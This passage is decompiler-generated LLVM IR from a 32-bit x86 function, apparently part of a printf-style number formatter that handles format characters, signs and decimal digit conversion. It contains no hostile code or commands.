dec_label_pc_80502c9:                             ; preds = %dec_label_pc_80502be
  %v2_80502d0 = sub i32 %v1_80502be, %v0_80502b9
  store i32 %v2_80502d0, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80502e5

dec_label_pc_80502d4:                             ; preds = %dec_label_pc_80502a7
  %v4_80502d4 = zext i8 %stack_var_-206.1 to i32
  %v5_80502d4 = load i32, i32* %ecx.global-to-local, align 4
  %v6_80502d4 = and i32 %v5_80502d4, -256
  %v7_80502d4 = or i32 %v6_80502d4, %v4_80502d4
  store i32 %v7_80502d4, i32* %ecx.global-to-local, align 4
  %v10_80502dc = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v10_80502dc, label %dec_label_pc_80502d4.dec_label_pc_80502e5_crit_edge, label %dec_label_pc_80502e1

dec_label_pc_80502d4.dec_label_pc_80502e5_crit_edge: ; preds = %dec_label_pc_80502d4
  %v0_80502e5.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80502e5

dec_label_pc_80502e1:                             ; preds = %dec_label_pc_80502b9, %dec_label_pc_80502be, %dec_label_pc_80502d4
  %stack_var_-197.0 = phi i8 [ %stack_var_-206.1, %dec_label_pc_80502d4 ], [ 103, %dec_label_pc_80502be ], [ 103, %dec_label_pc_80502b9 ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80502ef

dec_label_pc_80502e5:                             ; preds = %dec_label_pc_80502d4.dec_label_pc_80502e5_crit_edge, %dec_label_pc_80502c9
  %v0_80502e5 = phi i32 [ %v0_80502e5.pre, %dec_label_pc_80502d4.dec_label_pc_80502e5_crit_edge ], [ %v0_80502b9, %dec_label_pc_80502c9 ]
  store i32 %v0_80502e5, i32* %ebx.global-to-local, align 4
  %v2_80502e7 = icmp slt i32 %v0_80502e5, 0
  %v1_80502e9 = icmp eq i1 %v2_80502e7, false
  br i1 %v1_80502e9, label %dec_label_pc_80502ef, label %dec_label_pc_80502eb

dec_label_pc_80502eb:                             ; preds = %dec_label_pc_80502e5
  %v0_80502eb = load i32, i32* %edx.global-to-local, align 4
  %v1_80502eb = add i32 %v0_80502eb, -1
  store i32 %v1_80502eb, i32* %edx.global-to-local, align 4
  %v1_80502ec = inttoptr i32 %v1_80502eb to i8*
  store i8 48, i8* %v1_80502ec, align 1
  %v0_8050324.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80502ef

dec_label_pc_80502ef:                             ; preds = %dec_label_pc_80502e5, %dec_label_pc_80502e1, %dec_label_pc_80502eb
  %v1_805037f = phi i32 [ %v0_80502e5, %dec_label_pc_80502e5 ], [ %v0_8050324.pre, %dec_label_pc_80502eb ], [ 0, %dec_label_pc_80502e1 ]
  %stack_var_-197.2 = phi i8 [ 102, %dec_label_pc_80502e5 ], [ 102, %dec_label_pc_80502eb ], [ %stack_var_-197.0, %dec_label_pc_80502e1 ]
  %v2_80502ef = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_80502ef, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v0_805030a = load i32, i32* %edx.global-to-local, align 4
  %v1_805030a = inttoptr i32 %v0_805030a to i8*
  %v2_805030a = load i8, i8* %v1_805030a, align 1
  %v3_805030a = zext i8 %v2_805030a to i32
  %v5_805030a = and i32 %v2_80502ef, -256
  %v6_805030a = or i32 %v3_805030a, %v5_805030a
  store i32 %v6_805030a, i32* %eax.global-to-local, align 4
  %v1_805030c = add i32 %v0_805030a, 1
  store i32 %v1_805030c, i32* %edi.global-to-local, align 4
  store i32 %v6_805030a, i32* %stack_var_-22, align 4
  %v2_805031a = sub i32 %v1_80502a7, %v1_805030c
  store i32 %v2_805031a, i32* %edx.global-to-local, align 4
  %v1_8050324 = icmp eq i32 %v1_805037f, 0
  %v2_8050324 = icmp slt i32 %v1_805037f, 0
  br i1 %v2_8050324, label %dec_label_pc_8050373, label %dec_label_pc_8050328

dec_label_pc_8050328:                             ; preds = %dec_label_pc_80502ef
  store i32 112, i32* %stack_var_-144, align 4
  %v2_8050334 = sub i32 %v1_805037f, %v2_805031a
  %v8_8050334 = xor i32 %v2_805031a, %v1_805037f
  %v9_8050334 = xor i32 %v2_8050334, %v1_805037f
  %v10_8050334 = and i32 %v9_8050334, %v8_8050334
  %v11_8050334 = icmp slt i32 %v10_8050334, 0
  %v13_8050334 = icmp slt i32 %v2_8050334, 0
  %v2_8050336 = icmp eq i1 %v13_8050334, %v11_8050334
  br i1 %v2_8050336, label %dec_label_pc_8050338, label %dec_label_pc_805036c

dec_label_pc_8050338:                             ; preds = %dec_label_pc_8050328
  store i32 %v2_8050334, i32* %eax.global-to-local, align 4
  %tmp137 = icmp slt i32 %v2_8050334, 1
  %tmp138 = icmp eq i1 %tmp137, false
  br i1 %tmp138, label %dec_label_pc_805034d, label %dec_label_pc_8050368

dec_label_pc_805034d:                             ; preds = %dec_label_pc_8050338
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_8050368

dec_label_pc_8050368:                             ; preds = %dec_label_pc_8050338, %dec_label_pc_805034d
  %storemerge9.in = phi i32* [ %stack_var_-120, %dec_label_pc_805034d ], [ %stack_var_-132, %dec_label_pc_8050338 ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge9 = ptrtoint i32* %storemerge9.in to i32
  store i32 %storemerge9, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050388

dec_label_pc_805036c:                             ; preds = %dec_label_pc_8050328
  %v4_805036e = icmp eq i1 %v1_8050324, false
  br i1 %v4_805036e, label %dec_label_pc_8050379, label %dec_label_pc_8050370

dec_label_pc_8050370:                             ; preds = %dec_label_pc_805036c
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050373

dec_label_pc_8050373:                             ; preds = %dec_label_pc_80502ef, %dec_label_pc_8050370
  %v0_80503bb72 = phi i32 [ %v1_805037f, %dec_label_pc_80502ef ], [ -1, %dec_label_pc_8050370 ]
  %v2_8050373 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8050373, i32* @ecx, align 4
  br label %dec_label_pc_8050388

dec_label_pc_8050379:                             ; preds = %dec_label_pc_805036c
  %v2_805037d = add i32 %v1_805030c, %v1_805037f
  store i32 %v2_805037d, i32* %edi.global-to-local, align 4
  %v2_805037f = sub i32 %v2_805031a, %v1_805037f
  store i32 %v2_805037f, i32* %edx.global-to-local, align 4
  %v2_8050381 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8050381, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050388

dec_label_pc_8050388:                             ; preds = %dec_label_pc_8050373, %dec_label_pc_8050368, %dec_label_pc_8050379
  %v0_80503bb71 = phi i32 [ %v0_80503bb72, %dec_label_pc_8050373 ], [ -1, %dec_label_pc_8050368 ], [ -1, %dec_label_pc_8050379 ]
  %v0_80503a4 = phi i32 [ %v2_8050373, %dec_label_pc_8050373 ], [ %storemerge9, %dec_label_pc_8050368 ], [ %v2_8050381, %dec_label_pc_8050379 ]
  %v0_8050395 = phi i32 [ %v2_805031a, %dec_label_pc_8050373 ], [ 0, %dec_label_pc_8050368 ], [ %v2_805037f, %dec_label_pc_8050379 ]
  store i32 %tmp111, i32* %eax.global-to-local, align 4
  %v2_805038f = inttoptr i32 %v1_804ffe7 to i8*
  %v3_805038f = load i8, i8* %v2_805038f, align 1
  %v4_805038f = and i8 %v3_805038f, 16
  %v5_805038f = icmp eq i8 %v4_805038f, 0
  %v1_8050393 = icmp eq i1 %v5_805038f, false
  br i1 %v1_8050393, label %dec_label_pc_80503a4, label %dec_label_pc_8050395

dec_label_pc_8050395:                             ; preds = %dec_label_pc_8050388
  %v1_8050395 = icmp eq i32 %v0_8050395, 0
  %v1_8050397 = icmp eq i1 %v1_8050395, false
  br i1 %v1_8050397, label %dec_label_pc_80503a4, label %dec_label_pc_8050399

dec_label_pc_8050399:                             ; preds = %dec_label_pc_8050395
  br i1 %v12_80501fd, label %dec_label_pc_80503bb, label %dec_label_pc_80503a0

dec_label_pc_80503a0:                             ; preds = %dec_label_pc_8050399
  %v0_80503a0 = load i32, i32* %ebp.global-to-local, align 4
  %tmp139 = icmp slt i32 %v0_80503a0, 1
  br i1 %tmp139, label %dec_label_pc_80503bb, label %dec_label_pc_80503a4

dec_label_pc_80503a4:                             ; preds = %dec_label_pc_80503a0, %dec_label_pc_8050395, %dec_label_pc_8050388
  %v1_80503a4 = inttoptr i32 %v0_80503a4 to i32*
  store i32 112, i32* %v1_80503a4, align 4
  %v0_80503aa = load i32, i32* @ecx, align 4
  %v1_80503aa = add i32 %v0_80503aa, 4
  %v2_80503aa = inttoptr i32 %v1_80503aa to i32*
  store i32 1, i32* %v2_80503aa, align 4
  %v0_80503b1 = load i32, i32* @ecx, align 4
  %v1_80503b1 = add i32 %v0_80503b1, 8
  %v2_80503b1 = inttoptr i32 %v1_80503b1 to i32*
  store i32 ptrtoint (i32* @global_var_8054ba0.193 to i32), i32* %v2_80503b1, align 4
  %v0_80503b8 = load i32, i32* @ecx, align 4
  %v1_80503b8 = add i32 %v0_80503b8, 12
  store i32 %v1_80503b8, i32* @ecx, align 4
  %v0_80503bb.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80503bb

dec_label_pc_80503bb:                             ; preds = %dec_label_pc_80503a0, %dec_label_pc_8050399, %dec_label_pc_80503a4
  %v0_80503c0 = phi i32 [ %v0_80503a4, %dec_label_pc_80503a0 ], [ %v0_80503a4, %dec_label_pc_8050399 ], [ %v1_80503b8, %dec_label_pc_80503a4 ]
  %v0_80503bb = phi i32 [ %v0_80503bb71, %dec_label_pc_80503a0 ], [ %v0_80503bb71, %dec_label_pc_8050399 ], [ %v0_80503bb.pre, %dec_label_pc_80503a4 ]
  %v1_80503bb = add i32 %v0_80503bb, 1
  %v8_80503bb = icmp eq i32 %v1_80503bb, 0
  store i32 %v1_80503bb, i32* %ebx.global-to-local, align 4
  br i1 %v8_80503bb, label %dec_label_pc_80503d5, label %dec_label_pc_80503be

dec_label_pc_80503be:                             ; preds = %dec_label_pc_80503bb
  store i32 %v1_80503bb, i32* %eax.global-to-local, align 4
  %v1_80503c0 = inttoptr i32 %v0_80503c0 to i32*
  store i32 176, i32* %v1_80503c0, align 4
  %v0_80503c6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80503c6 = sub i32 0, %v0_80503c6
  store i32 %v1_80503c6, i32* %eax.global-to-local, align 4
  %v1_80503c8 = load i32, i32* @ecx, align 4
  %v2_80503c8 = add i32 %v1_80503c8, 4
  %v3_80503c8 = inttoptr i32 %v2_80503c8 to i32*
  store i32 %v1_80503c6, i32* %v3_80503c8, align 4
  %v0_80503cb = load i32, i32* @ecx, align 4
  %v1_80503cb = add i32 %v0_80503cb, 8
  %v2_80503cb = inttoptr i32 %v1_80503cb to i32*
  store i32 ptrtoint (i32* @global_var_8054b93.192 to i32), i32* %v2_80503cb, align 4
  %v0_80503d2 = load i32, i32* @ecx, align 4
  %v1_80503d2 = add i32 %v0_80503d2, 12
  store i32 %v1_80503d2, i32* @ecx, align 4
  br label %dec_label_pc_80503d5

dec_label_pc_80503d5:                             ; preds = %dec_label_pc_80503bb, %dec_label_pc_80503be
  %v0_80503d9 = phi i32 [ %v0_80503c0, %dec_label_pc_80503bb ], [ %v1_80503d2, %dec_label_pc_80503be ]
  %v0_80503d5 = load i32, i32* %edx.global-to-local, align 4
  %v1_80503d5 = icmp eq i32 %v0_80503d5, 0
  br i1 %v1_80503d5, label %dec_label_pc_80503e8, label %dec_label_pc_80503d9

dec_label_pc_80503d9:                             ; preds = %dec_label_pc_80503d5
  %v1_80503d9 = inttoptr i32 %v0_80503d9 to i32*
  store i32 112, i32* %v1_80503d9, align 4
  %v0_80503df = load i32, i32* %edx.global-to-local, align 4
  %v1_80503df = load i32, i32* @ecx, align 4
  %v2_80503df = add i32 %v1_80503df, 4
  %v3_80503df = inttoptr i32 %v2_80503df to i32*
  store i32 %v0_80503df, i32* %v3_80503df, align 4
  %v0_80503e2 = load i32, i32* %edi.global-to-local, align 4
  %v1_80503e2 = load i32, i32* @ecx, align 4
  %v2_80503e2 = add i32 %v1_80503e2, 8
  %v3_80503e2 = inttoptr i32 %v2_80503e2 to i32*
  store i32 %v0_80503e2, i32* %v3_80503e2, align 4
  %v0_80503e5 = load i32, i32* @ecx, align 4
  %v1_80503e5 = add i32 %v0_80503e5, 12
  store i32 %v1_80503e5, i32* @ecx, align 4
  br label %dec_label_pc_80503e8

dec_label_pc_80503e8:                             ; preds = %dec_label_pc_80503d5, %dec_label_pc_80503d9
  %v0_8050406 = phi i32 [ %v0_80503d9, %dec_label_pc_80503d5 ], [ %v1_80503e5, %dec_label_pc_80503d9 ]
  br i1 %v1_8050202, label %dec_label_pc_80503fc, label %dec_label_pc_80503ef

dec_label_pc_80503ef:                             ; preds = %dec_label_pc_80503e8
  store i32 %tmp111, i32* %eax.global-to-local, align 4
  %v3_80503f6 = load i8, i8* %v2_805038f, align 1
  %v4_80503f6 = and i8 %v3_80503f6, 16
  %v5_80503f6 = icmp eq i8 %v4_80503f6, 0
  br i1 %v5_80503f6, label %dec_label_pc_8050419, label %dec_label_pc_80503fc

dec_label_pc_80503fc:                             ; preds = %dec_label_pc_80503ef, %dec_label_pc_80503e8
  %v0_80503fc = load i32, i32* %edx.global-to-local, align 4
  %v1_80503fe = load i32, i32* %ebx.global-to-local, align 4
  %v2_80503fe = sub i32 %v0_80503fc, %v1_80503fe
  store i32 %v2_80503fe, i32* %eax.global-to-local, align 4
  %v1_8050400 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050400 = sub i32 %v2_80503fe, %v1_8050400
  %v8_8050400 = xor i32 %v1_8050400, %v2_80503fe
  %v9_8050400 = xor i32 %v2_8050400, %v2_80503fe
  %v10_8050400 = and i32 %v9_8050400, %v8_8050400
  %v11_8050400 = icmp slt i32 %v10_8050400, 0
  %v13_8050400 = icmp slt i32 %v2_8050400, 0
  %v2_8050402 = icmp eq i1 %v13_8050400, %v11_8050400
  br i1 %v2_8050402, label %dec_label_pc_8050419, label %dec_label_pc_8050404

dec_label_pc_8050404:                             ; preds = %dec_label_pc_80503fc
  %v2_8050404 = sub i32 %v1_8050400, %v2_80503fe
  store i32 %v2_8050404, i32* %ebp.global-to-local, align 4
  %v1_8050406 = inttoptr i32 %v0_8050406 to i32*
  store i32 176, i32* %v1_8050406, align 4
  %v0_805040c = load i32, i32* %ebp.global-to-local, align 4
  %v1_805040c = load i32, i32* @ecx, align 4
  %v2_805040c = add i32 %v1_805040c, 4
  %v3_805040c = inttoptr i32 %v2_805040c to i32*
  store i32 %v0_805040c, i32* %v3_805040c, align 4
  %v0_805040f = load i32, i32* @ecx, align 4
  %v1_805040f = add i32 %v0_805040f, 8
  %v2_805040f = inttoptr i32 %v1_805040f to i32*
  store i32 ptrtoint (i32* @global_var_8054b93.192 to i32), i32* %v2_805040f, align 4
  %v0_8050416 = load i32, i32* @ecx, align 4
  %v1_8050416 = add i32 %v0_8050416, 12
  store i32 %v1_8050416, i32* @ecx, align 4
  br label %dec_label_pc_8050419

dec_label_pc_8050419:                             ; preds = %dec_label_pc_80503fc, %dec_label_pc_80503ef, %dec_label_pc_8050404
  %v1_805049c83 = phi i32 [ %v0_8050406, %dec_label_pc_80503fc ], [ %v0_8050406, %dec_label_pc_80503ef ], [ %v1_8050416, %dec_label_pc_8050404 ]
  %v12_8050419 = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_8050419, label %dec_label_pc_805048f, label %dec_label_pc_8050420

dec_label_pc_8050420:                             ; preds = %dec_label_pc_8050419
  %v0_8050427 = load i32, i32* %esi.global-to-local, align 4
  %v2_8050427 = icmp slt i32 %v0_8050427, 0
  %v1_8050429 = trunc i32 %stack_var_-42.0 to i8
  store i32 %v0_8050427, i32* %edx.global-to-local, align 4
  br i1 %v2_8050427, label %dec_label_pc_8050438, label %dec_label_pc_805042f

dec_label_pc_805042f:                             ; preds = %dec_label_pc_8050420
  store i32 43, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050441

dec_label_pc_8050438:                             ; preds = %dec_label_pc_8050420
  store i32 45, i32* %edi.global-to-local, align 4
  %v1_805043f = sub i32 0, %v0_8050427
  store i32 %v1_805043f, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050441

dec_label_pc_8050441:                             ; preds = %dec_label_pc_805042f, %dec_label_pc_8050438
  %v0_805045576 = phi i32 [ %v0_8050427, %dec_label_pc_805042f ], [ %v1_805043f, %dec_label_pc_8050438 ]
  store i32 0, i32* %stack_var_-27, align 4
  %v2_8050449 = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_8050449, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050455

dec_label_pc_8050455:                             ; preds = %dec_label_pc_8050455.backedge, %dec_label_pc_8050441
  %v0_8050463 = phi i32 [ %v0_8050466, %dec_label_pc_8050455.backedge ], [ 2, %dec_label_pc_8050441 ]
  %v0_805045f = phi i32 [ %v0_805045f.pre, %dec_label_pc_8050455.backedge ], [ %v2_8050449, %dec_label_pc_8050441 ]
  %v0_8050455 = phi i32 [ %v9_805045d, %dec_label_pc_8050455.backedge ], [ %v0_805045576, %dec_label_pc_8050441 ]
  store i32 10, i32* %ebp.global-to-local, align 4
  %v1_805045c = ashr i32 %v0_8050455, 31
  %v2_805045d = zext i32 %v0_8050455 to i64
  %v4_805045d = zext i32 %v1_805045c to i64
  %v5_805045d = mul nuw i64 %v4_805045d, 4294967296
  %v6_805045d = or i64 %v5_805045d, %v2_805045d
  %v8_805045d = sdiv i64 %v6_805045d, 10
  %v9_805045d = trunc i64 %v8_805045d to i32
  store i32 %v9_805045d, i32* %eax.global-to-local, align 4
  %v11_805045d = srem i64 %v6_805045d, 10
  %v12_805045d = trunc i64 %v11_805045d to i8
  %v1_805045f = add i32 %v0_805045f, -1
  store i32 %v1_805045f, i32* %ebx.global-to-local, align 4
  %v1_8050460 = add i8 %v12_805045d, 48
  %v1_8050463 = add i32 %v0_8050463, 1
  store i32 %v1_8050463, i32* %esi.global-to-local, align 4
  %v3_8050464 = inttoptr i32 %v1_805045f to i8*
  store i8 %v1_8050460, i8* %v3_8050464, align 1
  %v0_8050466 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v9_805045d, i32* %edx.global-to-local, align 4
  %v7_805046b = icmp sgt i32 %v0_8050466, 3
  br i1 %v7_805046b, label %dec_label_pc_805046d, label %dec_label_pc_8050455.backedge

dec_label_pc_805046d:                             ; preds = %dec_label_pc_8050455
  %v2_805046d = icmp eq i32 %v9_805045d, 0
  %v1_805046f = icmp eq i1 %v2_805046d, false
  br i1 %v1_805046f, label %dec_label_pc_8050455.backedge, label %dec_label_pc_8050471

dec_label_pc_8050455.backedge:                    ; preds = %dec_label_pc_805046d, %dec_label_pc_8050455
  %v0_805045f.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050455

dec_label_pc_8050471:                             ; preds = %dec_label_pc_805046d
  %v0_8050471 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_8050471, i32* %edx.global-to-local, align 4
  %v0_8050473 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050473 = add i32 %v0_8050473, -2
  store i32 %v1_8050473, i32* %eax.global-to-local, align 4
  %v1_8050476 = trunc i32 %v0_8050471 to i8
  %v3_8050476 = add i32 %v0_8050473, -1
  %v4_8050476 = inttoptr i32 %v3_8050476 to i8*
  store i8 %v1_8050476, i8* %v4_8050476, align 1
  %v5_8050479 = load i32, i32* %edx.global-to-local, align 4
  %v6_8050479 = and i32 %v5_8050479, -256
  %v7_8050479 = or i32 %v6_8050479, %stack_var_-42.0
  store i32 %v7_8050479, i32* %edx.global-to-local, align 4
  %v2_805047d = load i32, i32* %ebx.global-to-local, align 4
  %v3_805047d = add i32 %v2_805047d, -2
  %v4_805047d = inttoptr i32 %v3_805047d to i8*
  store i8 %v1_8050429, i8* %v4_805047d, align 1
  %v0_8050480 = load i32, i32* @ecx, align 4
  %v1_8050480 = inttoptr i32 %v0_8050480 to i32*
  store i32 112, i32* %v1_8050480, align 4
  %v0_8050486 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050486 = load i32, i32* @ecx, align 4
  %v2_8050486 = add i32 %v1_8050486, 4
  %v3_8050486 = inttoptr i32 %v2_8050486 to i32*
  store i32 %v0_8050486, i32* %v3_8050486, align 4
  %v0_8050489 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050489 = load i32, i32* @ecx, align 4
  %v2_8050489 = add i32 %v1_8050489, 8
  %v3_8050489 = inttoptr i32 %v2_8050489 to i32*
  store i32 %v0_8050489, i32* %v3_8050489, align 4
  %v0_805048c = load i32, i32* @ecx, align 4
  %v1_805048c = add i32 %v0_805048c, 12
  store i32 %v1_805048c, i32* @ecx, align 4
  br label %dec_label_pc_805048f

dec_label_pc_805048f:                             ; preds = %dec_label_pc_8050419, %dec_label_pc_80500b4, %dec_label_pc_8050471
  %v0_8050510 = phi i32 [ %v1_805049c83, %dec_label_pc_8050419 ], [ %v2_80500bc, %dec_label_pc_80500b4 ], [ %v1_805048c, %dec_label_pc_8050471 ]
  %v2_805048f = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_805048f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050493

dec_label_pc_8050493:                             ; preds = %dec_label_pc_8050493, %dec_label_pc_805048f
  %v0_8050493 = phi i32 [ %v2_805048f, %dec_label_pc_805048f ], [ %v1_8050495, %dec_label_pc_8050493 ]
  %stack_var_-216.0 = phi i32 [ %v3_804ffa7, %dec_label_pc_805048f ], [ %v5_8050498, %dec_label_pc_8050493 ]
  %v1_8050493 = inttoptr i32 %v0_8050493 to i32*
  %v2_8050493 = load i32, i32* %v1_8050493, align 4
  store i32 %v2_8050493, i32* %edx.global-to-local, align 4
  %v1_8050495 = add i32 %v0_8050493, 12
  store i32 %v1_8050495, i32* %eax.global-to-local, align 4
  %v5_8050498 = sub i32 %stack_var_-216.0, %v2_8050493
  %v7_805049c = icmp ult i32 %v1_8050495, %v0_8050510
  br i1 %v7_805049c, label %dec_label_pc_8050493, label %dec_label_pc_80504a0

dec_label_pc_80504a0:                             ; preds = %dec_label_pc_8050493
  %v5_80504a9 = icmp eq i8 %stack_var_-26.0, 0
  %v1_80504b9 = icmp eq i1 %v5_80504a9, false
  %v2_80504b9 = zext i1 %v1_80504b9 to i32
  %v2_80504bc = sub i32 %v5_8050498, %v2_80504b9
  store i32 %v2_80504bc, i32* %edx.global-to-local, align 4
  store i32 160, i32* %stack_var_-168, align 4
  store i32 %v2_80504bc, i32* %eax.global-to-local, align 4
  store i32 %v0_8050510, i32* %esi.global-to-local, align 4
  %tmp140 = icmp slt i32 %v2_80504bc, 1
  br i1 %tmp140, label %dec_label_pc_8050512, label %dec_label_pc_80504d2

dec_label_pc_80504d2:                             ; preds = %dec_label_pc_80504a0
  store i32 %tmp111, i32* %edx.global-to-local, align 4
  %v2_80504d9 = inttoptr i32 %v1_804ffe7 to i8*
  %v3_80504d9 = load i8, i8* %v2_80504d9, align 1
  %v4_80504d9 = and i8 %v3_80504d9, 8
  %v5_80504d9 = icmp eq i8 %v4_80504d9, 0
  br i1 %v5_80504d9, label %dec_label_pc_80504f4, label %dec_label_pc_80504df

dec_label_pc_80504df:                             ; preds = %dec_label_pc_80504d2
  %v1_80504df = add i32 %v0_8050510, 12
  store i32 %v1_80504df, i32* %esi.global-to-local, align 4
  %v1_80504e2 = inttoptr i32 %v0_8050510 to i32*
  store i32 160, i32* %v1_80504e2, align 4
  %v0_80504e8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80504e8 = load i32, i32* @ecx, align 4
  %v2_80504e8 = add i32 %v1_80504e8, 4
  %v3_80504e8 = inttoptr i32 %v2_80504e8 to i32*
  store i32 %v0_80504e8, i32* %v3_80504e8, align 4
  %v0_80504eb = load i32, i32* @ecx, align 4
  %v1_80504eb = add i32 %v0_80504eb, 8
  %v2_80504eb = inttoptr i32 %v1_80504eb to i32*
  store i32 ptrtoint (i32* @global_var_8054b93.192 to i32), i32* %v2_80504eb, align 4
  br label %dec_label_pc_8050512

dec_label_pc_80504f4:                             ; preds = %dec_label_pc_80504d2
  store i32 %tmp111, i32* %edx.global-to-local, align 4
  %v1_80504fb = add i32 %tmp111, 16
  %v2_80504fb = inttoptr i32 %v1_80504fb to i32*
  %v3_80504fb = load i32, i32* %v2_80504fb, align 4
  %v9_80504fb = icmp eq i32 %v3_80504fb, 48
  %v1_80504ff = icmp eq i1 %v9_80504fb, false
  br i1 %v1_80504ff, label %dec_label_pc_805050c, label %dec_label_pc_8050501

dec_label_pc_8050501:                             ; preds = %dec_label_pc_80504f4
  %v3_8050501 = load i32, i32* %stack_var_-152, align 4
  %v5_8050501 = add i32 %v3_8050501, %v2_80504bc
  store i32 %v5_8050501, i32* %stack_var_-152, align 4
  br label %dec_label_pc_8050510

dec_label_pc_8050507:                             ; preds = %dec_label_pc_8050518
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805053f

dec_label_pc_805050c:                             ; preds = %dec_label_pc_80504f4
  br label %dec_label_pc_8050510

dec_label_pc_8050510:                             ; preds = %dec_label_pc_8050501, %dec_label_pc_805050c
  store i32 %v0_8050510, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050512

dec_label_pc_8050512:                             ; preds = %dec_label_pc_80504a0, %dec_label_pc_80504df, %dec_label_pc_8050510
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_8050514 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_8050514, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050518

dec_label_pc_8050518:                             ; preds = %dec_label_pc_8050536, %dec_label_pc_8050512
  call void @__pseudo_call(i32 %tmp111)
  %v0_8050531 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050531 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050531 = add i32 %v1_8050531, 4
  %v3_8050531 = inttoptr i32 %v2_8050531 to i32*
  %v4_8050531 = load i32, i32* %v3_8050531, align 4
  %v15_8050531 = icmp eq i32 %v0_8050531, %v4_8050531
  %v1_8050534 = icmp eq i1 %v15_8050531, false
  br i1 %v1_8050534, label %dec_label_pc_8050507, label %dec_label_pc_8050536

dec_label_pc_8050536:                             ; preds = %dec_label_pc_8050518
  %v1_8050536 = add i32 %v1_8050531, 12
  store i32 %v1_8050536, i32* %ebx.global-to-local, align 4
  %v0_8050539 = load i32, i32* %edi.global-to-local, align 4
  %v2_8050539 = add i32 %v0_8050539, %v0_8050531
  store i32 %v2_8050539, i32* %edi.global-to-local, align 4
  %v1_805053b = load i32, i32* %esi.global-to-local, align 4
  %v7_805053b = icmp ult i32 %v1_8050536, %v1_805053b
  br i1 %v7_805053b, label %dec_label_pc_8050518, label %dec_label_pc_805053f

dec_label_pc_805053f:                             ; preds = %dec_label_pc_8050536, %dec_label_pc_8050507
  %v0_8050545 = phi i32 [ -1, %dec_label_pc_8050507 ], [ %v2_8050539, %dec_label_pc_8050536 ]
  store i32 %v0_8050545, i32* %eax.global-to-local, align 4
  %v2_8050548 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050548, i32* @esi, align 4
  store i32 %v0_804ff8a, i32* @edi, align 4
  store i32 %v0_804ff89, i32* @ebp, align 4
  ret i32 %v0_8050545

; uselistorder directives
  uselistorder i32 %v0_8050545, { 1, 0 }
  uselistorder i32 %v1_8050495, { 1, 2, 0 }
  uselistorder i32 %v0_8050493, { 1, 0 }
  uselistorder i32 %v0_8050510, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v0_8050466, { 1, 0 }
  uselistorder i32 %v9_805045d, { 1, 2, 3, 0 }
  uselistorder i32 %v0_8050455, { 1, 0 }
  uselistorder i32 %v0_8050427, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8050400, { 1, 0 }
  uselistorder i32 %v1_8050400, { 1, 0, 2 }
  uselistorder i32 %v2_80503fe, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_8050334, { 2, 1, 3, 0 }
  uselistorder i32 %v2_805031a, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_805037f, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v0_80502e5, { 0, 2, 1 }
  uselistorder i32 %v1_80502be, { 1, 0 }
  uselistorder i32 %v0_80502b9, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8050286, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_8050281, { 1, 0 }
  uselistorder i8 %v2_805027a, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_805027a, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8050204, { 1, 2, 0 }
  uselistorder i8 %stack_var_-206.1, { 3, 1, 4, 0, 2 }
  uselistorder i8 %v4_80501e9, { 1, 0 }
  uselistorder i32 %v1_80501d5, { 1, 0 }
  uselistorder i32 %v0_80501c9, { 1, 0 }
  uselistorder i32 %v4_80501b0, { 1, 0 }
  uselistorder i32 %tmp148, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_80501b5, { 1, 0 }
  uselistorder i32 %v2_8050173, { 1, 0, 2 }
  uselistorder i3 %v1_8050029, { 1, 0 }
  uselistorder i8 %v4_80500a8, { 1, 0 }
  uselistorder i32 %v3_804ffe7, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_804ffe7, { 1, 0, 2 }
  uselistorder i8 %stack_var_-206.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
